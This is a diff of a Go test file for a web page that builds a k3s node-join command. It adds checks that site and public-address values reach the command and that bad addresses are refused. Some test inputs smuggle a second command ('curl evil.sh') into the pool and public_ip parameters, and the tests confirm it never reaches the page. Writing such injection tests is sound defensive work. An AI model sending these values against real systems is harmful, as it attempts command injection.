@@ -53,11 +53,11 @@ func (f *fakeJoiner) SetDNS(_ context.Context, target, prefix string) error {
 	return nil
 }
 
-func (f *fakeJoiner) Command(_ context.Context, pool string) (string, error) {
+func (f *fakeJoiner) Command(_ context.Context, m cluster.Machine) (string, error) {
 	if !f.configured {
 		return "", cluster.ErrNotConfigured
 	}
-	return cluster.BuildCommand("https://10.0.0.1:6443", probeToken, pool), nil
+	return cluster.BuildCommand("https://10.0.0.1:6443", probeToken, m), nil
 }
 
 // joinServer builds a server whose viewer holds role in the team.
@@ -203,5 +203,44 @@ func TestThePoolRidesInTheCommandAndIsChecked(t *testing.T) {
 	body = do(h, signedIn(http.MethodGet, "/cluster/nodes/add?pool=web%3Bcurl+evil.sh")).Body.String()
 	if strings.Contains(body, "curl evil.sh") {
 		t.Fatal("a pool name that ends the command reached the page")
+	}
+}
+
+// A machine at another site joins with its site and, behind NAT, the address
+// the others reach it at. Both ride in the command, and the page keeps asking
+// about the same machine while it watches for it to arrive.
+func TestTheSiteAndPublicAddressRideInTheCommand(t *testing.T) {
+	h := joinServer(t, &fakeJoiner{configured: true}, account.RoleOwner)
+
+	body := do(h, signedIn(http.MethodGet,
+		"/cluster/nodes/add?pool=web&site=dar-b&public_ip=2001:db8::7")).Body.String()
+	for _, want := range []string{
+		"--node-label yacht/pool=web",
+		"--node-label topology.kubernetes.io/zone=dar-b",
+		"--node-external-ip 2001:db8::7",
+		`hx-get="/cluster/nodes/add/status?pool=web&amp;public_ip=2001%3Adb8%3A%3A7&amp;site=dar-b"`,
+		"51820/udp",
+	} {
+		if !strings.Contains(body, want) {
+			t.Errorf("the page is missing %q", want)
+		}
+	}
+}
+
+// An address that is not one is refused before it reaches the command, and
+// takes the command with it rather than leaving the machine joined without it.
+func TestAPublicAddressThatIsNotOneIsRefused(t *testing.T) {
+	h := joinServer(t, &fakeJoiner{configured: true}, account.RoleOwner)
+
+	body := do(h, signedIn(http.MethodGet,
+		"/cluster/nodes/add?site=dar-b&public_ip=1.2.3.4%3Bcurl+evil.sh")).Body.String()
+	if strings.Contains(body, "curl evil.sh") {
+		t.Fatal("a public address that ends the command reached the page")
+	}
+	if strings.Contains(body, "K3S_TOKEN=") {
+		t.Error("a command was built around a refused address")
+	}
+	if !strings.Contains(body, "must be an IP address") {
+		t.Error("the page does not say what was wrong with the address")
 	}
 }
